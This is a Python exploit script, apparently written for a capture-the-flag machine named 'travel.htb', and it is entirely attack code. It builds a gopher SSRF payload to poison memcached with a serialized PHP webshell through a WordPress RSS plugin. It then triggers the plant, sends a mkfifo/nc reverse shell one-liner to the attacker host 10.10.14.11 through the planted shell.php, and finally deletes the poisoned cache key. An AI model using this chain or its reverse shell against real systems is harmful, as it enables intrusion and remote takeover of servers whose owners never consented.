import urllib
import subprocess
import hashlib
import requests

print("[+] Serializing webshell")
code = subprocess.check_output(["php", "payload.php"])

raw_input("[.] Fire up webserver there: python -m SimpleHTTPServer 8000, and then press Enter")
SRVHOST = "10.10.14.11"
SRVPORT = 8000
decoy_url = "http://" + SRVHOST + ":" + str(SRVPORT) + "/decoy.xml"

print("[+] Creating payloads")
hash_addr = "xct_" + hashlib.md5(hashlib.md5(decoy_url).hexdigest() + ":spc").hexdigest()
payload = "%0d%0aset " + hash_addr + " 4 0 " + str(len(code)) + "%0d%0a" +  code + "%0d%0a"
payload = urllib.quote_plus(payload).replace("+", "%20").replace("%2F", "/").replace("%25", "%").replace("%3A", ":")

inject_payload = "gopher://127.1:11211/_" + payload
delete_payload = "gopher://127.1:11211/_%0d%0adelete%20" + hash_addr + "%0d%0a"

raw_input("[.] Fire up netcat listener: nc -lvp 4242, and then press Enter")
print("[+] Exploiting")
requests.get("http://blog.travel.htb/awesome-rss/?custom_feed_url=" + decoy_url)
requests.get("http://blog.travel.htb/awesome-rss/?custom_feed_url=" + inject_payload)
requests.get("http://blog.travel.htb/awesome-rss/?custom_feed_url=" + decoy_url)

print("[+] Starting a reverse TCP shell")
reverse_tcp_payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + SRVHOST + " 4242 >/tmp/f"
reverse_tcp_payload = urllib.quote_plus(reverse_tcp_payload).replace("+", "%20").replace("%2F", "/").replace("%25", "%").replace("%3A", ":")
requests.get("http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=" + reverse_tcp_payload)
requests.get("http://blog.travel.htb/awesome-rss/?custom_feed_url=" + delete_payload)
print("[+] K thx bye!")
